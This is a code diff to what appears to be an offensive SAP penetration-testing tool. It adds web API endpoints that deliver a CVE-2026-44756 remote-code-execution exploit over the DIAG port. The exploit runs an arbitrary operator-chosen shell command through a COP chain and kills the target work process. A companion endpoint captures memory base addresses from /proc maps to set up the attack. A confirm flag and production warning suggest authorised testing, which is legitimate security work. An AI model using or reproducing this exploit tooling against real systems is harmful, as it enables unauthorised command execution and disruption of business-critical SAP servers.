@@ -7989,6 +7989,225 @@ def create_app(api: SAPMAPApi) -> Bottle:
         _bg(f"{sid}:dos_cve_44756", "CVE-2026-44756 DoS trigger", _run)
         return json.dumps({"status": "started"})
 
+    @app.route("/api/node/<sid>/exploit_cve_2026_44756_diag_rce", method="POST")
+    def node_exploit_cve_2026_44756_diag_rce(sid):
+        """DIAG channel: fire Julian's two-stage COP chain into
+        eppDeserialize, producing system(<cmd>) in the target work
+        process.  DESTRUCTIVE: the delivering work process dies after
+        the command runs; SAP re-forks it.
+
+        Body params (all optional):
+            confirm      — must be true
+            command      — shell command (default:
+                              `id > /tmp/sapmap_cve_44756_proof.txt`)
+            dw_base_hex  — override auto-capture
+            libc_base_hex — override auto-capture
+            rdx_hex      — required; measure with tools/cve-2026-44756/
+                            find_rdx.py or supply from prior recon
+            diag_port    — override DIAG dispatcher port (default: node
+                            instance's dispatcher, else 3200)
+            auto_capture — attempt OS-exec base capture (default: true)
+        """
+        response.content_type = "application/json"
+        data = request.json or {}
+        if not data.get("confirm"):
+            return json.dumps({"error":
+                "confirm=true required — this action runs an "
+                "attacker-controlled shell command on the target "
+                "and kills the delivering SAP work process. Do NOT "
+                "run on production systems."})
+
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        command = (data.get("command") or "").strip() \
+                    or "id > /tmp/sapmap_cve_44756_proof.txt"
+        dw_hex   = (data.get("dw_base_hex")   or "").strip()
+        libc_hex = (data.get("libc_base_hex") or "").strip()
+        rdx_hex  = (data.get("rdx_hex")        or "").strip()
+        auto_cap = data.get("auto_capture", True)
+
+        # DIAG port: use the node's dispatcher if we know it, else 3200.
+        diag_port = int(data.get("diag_port") or 0)
+        if diag_port <= 0:
+            for inst in getattr(node, "instances", []) or []:
+                p = inst.get("dispatcher_port") or inst.get("port")
+                if p and 3200 <= int(p) <= 3299:
+                    diag_port = int(p); break
+            if diag_port <= 0:
+                diag_port = 3200
+
+        def _run():
+            from sap_cve_2026_44756_diag import (
+                auto_capture_bases,
+                trigger_diag_rce,
+            )
+            print(f"[!] {sid}: CVE-2026-44756 DIAG RCE — "
+                  f"target dispatcher {node.ip}:{diag_port}")
+            print(f"[!] {sid}: command = {command!r}")
+            print(f"[!] {sid}: DESTRUCTIVE — one work process will "
+                  f"die after the command runs; SAP re-forks it.")
+
+            # Resolve dw_base / libc_base — prefer operator override,
+            # then cached values on the node, then auto-capture via
+            # OS-exec.
+            dw_base = int(dw_hex, 16) if dw_hex else 0
+            libc_base = int(libc_hex, 16) if libc_hex else 0
+
+            if not dw_base and node.cve_2026_44756_dw_base:
+                try:
+                    dw_base = int(node.cve_2026_44756_dw_base, 16)
+                    print(f"[*] {sid}: using cached dw_base "
+                          f"{dw_base:#x}")
+                except ValueError:
+                    dw_base = 0
+            if not libc_base and node.cve_2026_44756_libc_base:
+                try:
+                    libc_base = int(node.cve_2026_44756_libc_base, 16)
+                    print(f"[*] {sid}: using cached libc_base "
+                          f"{libc_base:#x}")
+                except ValueError:
+                    libc_base = 0
+
+            if (not dw_base or not libc_base) and auto_cap:
+                print(f"[*] {sid}: auto-capturing dw / libc bases via "
+                      f"SAPMAP's OS-exec channel …")
+                cap = auto_capture_bases(node)
+                if cap.get("ok"):
+                    if not dw_base:
+                        dw_base = cap["dw_base"]
+                    if not libc_base:
+                        libc_base = cap["libc_base"]
+                    node.cve_2026_44756_dw_base = f"{dw_base:#x}"
+                    node.cve_2026_44756_libc_base = f"{libc_base:#x}"
+                    print(f"[+] {sid}: captured — dw={dw_base:#x} "
+                          f"libc={libc_base:#x} wp_pid={cap.get('wp_pid')}")
+                else:
+                    print(f"[-] {sid}: auto-capture failed: "
+                          f"{cap.get('error')}.  Supply dw_base_hex "
+                          f"and libc_base_hex manually or arrange an "
+                          f"OS-exec channel first.")
+                    return
+
+            if not dw_base or not libc_base:
+                print(f"[-] {sid}: cannot proceed without dw_base and "
+                      f"libc_base.  Aborting.")
+                return
+
+            # rdx is per-instance.  Prefer operator override, then
+            # cached node value.  If neither, prompt operator explicitly.
+            rdx = int(rdx_hex, 16) if rdx_hex else 0
+            if not rdx and node.cve_2026_44756_session_rdx:
+                try:
+                    rdx = int(node.cve_2026_44756_session_rdx, 16)
+                    print(f"[*] {sid}: using cached rdx {rdx:#x}")
+                except ValueError:
+                    rdx = 0
+
+            if not rdx:
+                print(f"[-] {sid}: rdx_hex missing — cannot deliver "
+                      f"DIAG RCE without the session-buffer landing "
+                      f"address.  Measure it once with "
+                      f"tools/cve-2026-44756/find_rdx.py running on "
+                      f"the target (as the SAP instance owner or "
+                      f"root), then re-run this action with rdx_hex "
+                      f"set.  Alternatively, run the ptrace helper "
+                      f"deployment flow via 'Capture rdx via ptrace' "
+                      f"(SAPMAP will deploy the helper and wait for "
+                      f"the crash reading).")
+                return
+
+            res = trigger_diag_rce(node.ip, diag_port,
+                                     dw_base, libc_base, rdx,
+                                     command)
+            print(f"[*] {sid}: payload {res['passport_len']}B, "
+                  f"stage1 RIP {res['stage1']:#x}, "
+                  f"stage2 {res['stage2']:#x}, "
+                  f"system {res['system']:#x}")
+            print(f"[*] {sid}: wire delivered={res['delivered']} "
+                  f"dropped={res['connection_dropped']} "
+                  f"resp_bytes={res['response_bytes']}")
+
+            if res["delivered"] and res["connection_dropped"] \
+                    and not res["response_bytes"]:
+                node.cve_2026_44756_rce_confirmed = True
+                node.cve_2026_44756_vulnerable = True
+                node.cve_2026_44756_evidence = "diag_rce_signature"
+                node.cve_2026_44756_session_rdx = f"{rdx:#x}"
+                print(f"[!!] {sid}: DIAG RCE delivery signature "
+                      f"matches success — connection dropped with "
+                      f"zero reply bytes, which means the work "
+                      f"process took the hijack and died after "
+                      f"running system({command!r}).")
+                print(f"[!!] {sid}: Verify side-effect on target "
+                      f"(e.g. `ls -l /tmp/sapmap_cve_44756_proof.txt`) "
+                      f"to confirm RCE.")
+                sapmap_findings.emit_finding(
+                    "CRITICAL", sid,
+                    f"CVE-2026-44756 (OVERPASS) DIAG RCE delivered "
+                    f"on {node.ip}:{diag_port} — bug-C stack "
+                    f"overflow + two-stage COP chain executed "
+                    f"system({command!r}) in a work process. "
+                    f"Kernel {node.kernel} is below the CVSS-10.0 "
+                    f"fix (SAP Note 3747649). Verify side-effect "
+                    f"on the target file system to close the "
+                    f"engagement finding.",
+                    cve="CVE-2026-44756",
+                    ref="cve_2026_44756.diag_rce",
+                    attack_capability="exploit.cve_2026_44756")
+            else:
+                print(f"[?] {sid}: DIAG delivery did NOT match RCE "
+                      f"signature.  Possible reasons: (a) wrong "
+                      f"dw/libc/rdx values (kernel or glibc build "
+                      f"differs from the reference), (b) DIAG port "
+                      f"blocked / non-vulnerable, (c) exploit item "
+                      f"dropped upstream.")
+                if res.get("response_preview_hex"):
+                    print(f"[?] {sid}: reply preview: "
+                          f"{res['response_preview_hex']}")
+                if res.get("error"):
+                    print(f"[?] {sid}: wire error: {res['error']}")
+
+        _bg(f"{sid}:diag_rce_cve_44756",
+             "CVE-2026-44756 DIAG RCE", _run)
+        return json.dumps({"status": "started"})
+
+    @app.route("/api/node/<sid>/exploit_cve_2026_44756_capture_bases",
+                method="POST")
+    def node_exploit_cve_2026_44756_capture_bases(sid):
+        """Recon-only helper — read dw_base and libc_base from a live
+        work process's /proc/<pid>/maps through SAPMAP's OS-exec
+        channel.  No wire delivery, no crash.  Caches the values on
+        the node so the DIAG RCE handler can reuse them without a
+        second exec round-trip."""
+        response.content_type = "application/json"
+        node = api.state.get_node(sid)
+        if not node:
+            return json.dumps({"error": f"Node {sid} not found"})
+
+        def _run():
+            from sap_cve_2026_44756_diag import auto_capture_bases
+            print(f"[*] {sid}: CVE-2026-44756 base capture — "
+                  f"reading /proc/<wp_pid>/maps via OS-exec …")
+            cap = auto_capture_bases(node)
+            if cap.get("ok"):
+                node.cve_2026_44756_dw_base = f"{cap['dw_base']:#x}"
+                node.cve_2026_44756_libc_base = f"{cap['libc_base']:#x}"
+                print(f"[+] {sid}: dw_base   {cap['dw_base']:#x}")
+                print(f"[+] {sid}: libc_base {cap['libc_base']:#x}")
+                print(f"[+] {sid}: wp_pid    {cap.get('wp_pid')}")
+                print(f"[*] {sid}: bases cached on node.  Still need "
+                      f"rdx (session-buffer landing address) — measure "
+                      f"it once via tools/cve-2026-44756/find_rdx.py.")
+            else:
+                print(f"[-] {sid}: base capture failed: "
+                      f"{cap.get('error')}")
+
+        _bg(f"{sid}:capbases_cve_44756",
+             "CVE-2026-44756 base capture", _run)
+        return json.dumps({"status": "started"})
+
     @app.route("/api/node/<sid>/check_cve_2026_58240", method="POST")
     def node_check_cve_2026_58240(sid):
         """Probe MS internal port for the ASCS_GW opcode family
